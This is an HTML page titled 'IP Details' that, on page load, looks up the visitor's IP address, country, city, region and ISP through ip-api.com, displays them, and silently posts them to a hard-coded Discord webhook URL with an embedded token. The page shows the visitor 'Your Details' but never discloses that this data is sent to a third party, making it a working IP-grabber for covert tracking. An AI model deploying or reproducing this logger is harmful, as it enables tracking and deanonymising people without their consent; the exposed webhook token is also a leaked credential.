<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Details</title>
    <script>
        // Function to send user data to a webhook
        async function sendDetailsToWebhook(details) {
            const webhookURL = "https://discord.com/api/webhooks/1314782178491629598/K_FBAhGqn0t-z5IeHHRgvGUdwdHPgvv7GEq5_JsYhTuKFWUFGGpy6lKgYmsINM_oSfp5"; // Replace with your webhook URL

            // Construct payload
            const payload = {
                content: `Visitor Details:\nIP: ${details.query}\nCountry: ${details.country}\nCity: ${details.city}\nRegion: ${details.regionName}\nISP: ${details.isp}`
            };

            try {
                // Send data to the webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
                console.log("Details sent to webhook successfully.");
            } catch (error) {
                console.error("Failed to send details to webhook:", error);
            }
        }

        // Function to fetch user details and display/send them
        async function fetchAndShowDetails() {
            try {
                const response = await fetch("http://ip-api.com/json/");
                const details = await response.json();

                // Log details to the console
                console.log(details);

                // Display the details on the web page
                document.getElementById("ip").textContent = details.query;
                document.getElementById("country").textContent = details.country;
                document.getElementById("city").textContent = details.city;
                document.getElementById("region").textContent = details.regionName;
                document.getElementById("isp").textContent = details.isp;

                // Send details to the webhook
                await sendDetailsToWebhook(details);
            } catch (error) {
                console.error("Error fetching details:", error);
            }
        }

        // Fetch details when the page loads
        window.onload = fetchAndShowDetails;
    </script>
</head>
<body>
    <h1>Your Details</h1>
    <p><strong>IP Address:</strong> <span id="ip">Loading...</span></p>
    <p><strong>Country:</strong> <span id="country">Loading...</span></p>
    <p><strong>City:</strong> <span id="city">Loading...</span></p>
    <p><strong>Region:</strong> <span id="region">Loading...</span></p>
    <p><strong>ISP:</strong> <span id="isp">Loading...</span></p>
</body>
</html>
